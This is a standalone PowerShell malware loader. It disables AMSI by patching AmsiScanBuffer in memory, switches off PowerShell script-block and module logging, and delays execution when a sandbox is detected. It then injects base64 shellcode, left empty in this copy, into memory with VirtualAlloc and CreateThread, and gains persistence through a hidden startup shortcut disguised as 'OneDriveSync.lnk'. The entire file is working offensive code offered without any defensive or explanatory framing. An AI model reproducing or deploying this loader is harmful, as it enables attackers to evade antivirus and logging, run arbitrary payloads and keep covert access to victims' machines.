$ErrorActionPreference = 'SilentlyContinue'

$amsi = @'
using System;
using System.Runtime.InteropServices;
public class Amsi {
    [DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")] static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")] static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    public static void Patch() {
        IntPtr lib = LoadLibrary("amsi.dll");
        if (lib == IntPtr.Zero) return;
        IntPtr addr = GetProcAddress(lib, "AmsiScanBuffer");
        if (addr == IntPtr.Zero) return;
        uint old;
        VirtualProtect(addr, (UIntPtr)6, 0x40, out old);
        Marshal.Copy(new byte[] { 0x31, 0xC0, 0xC3 }, 0, addr, 3);
        VirtualProtect(addr, (UIntPtr)6, old, out old);
    }
}
'@
Add-Type $amsi
[Amsi]::Patch()

$settings = [Ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static').GetValue($null)
$settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'] = @{}
$settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
$settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging'] = @{}
$settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging']['EnableModuleLogging'] = 0

try {
    $totalRAM = (Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB
    $cpuCores = (Get-WmiObject Win32_Processor).NumberOfCores
    $procCount = (Get-Process).Count
    if ($totalRAM -lt 2 -or $cpuCores -lt 2 -or $procCount -lt 30) {
        Start-Sleep -Seconds 300
    }
} catch { }
Start-Sleep -Seconds (Get-Random -Min 5 -Max 30)

$base64Shellcode = ""
$base64Shellcode = $base64Shellcode -replace '\s', ''
$shellcode = [Convert]::FromBase64String($base64Shellcode)

$inject = @'
using System;
using System.Runtime.InteropServices;
public class Inject {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
    public static void Run(byte[] payload) {
        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)payload.Length, 0x3000, 0x40);
        if (addr == IntPtr.Zero) return;
        Marshal.Copy(payload, 0, addr, payload.Length);
        uint old;
        VirtualProtect(addr, (uint)payload.Length, 0x20, out old);
        CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
    }
}
'@
Add-Type $inject
[Inject]::Run($shellcode)

Start-Sleep -Seconds 10

$flag = "$env:TEMP\persist_$([Environment]::MachineName.GetHashCode()).dat"
if (-not (Test-Path $flag)) {
    $lnkPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\OneDriveSync.lnk"
    $wsh = New-Object -ComObject WScript.Shell
    $lnk = $wsh.CreateShortcut($lnkPath)
    $lnk.TargetPath = "powershell.exe"
    $lnk.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    $lnk.Save()
    New-Item -Path $flag -Force | Out-Null
}

Start-Sleep -Seconds 30
exit 0
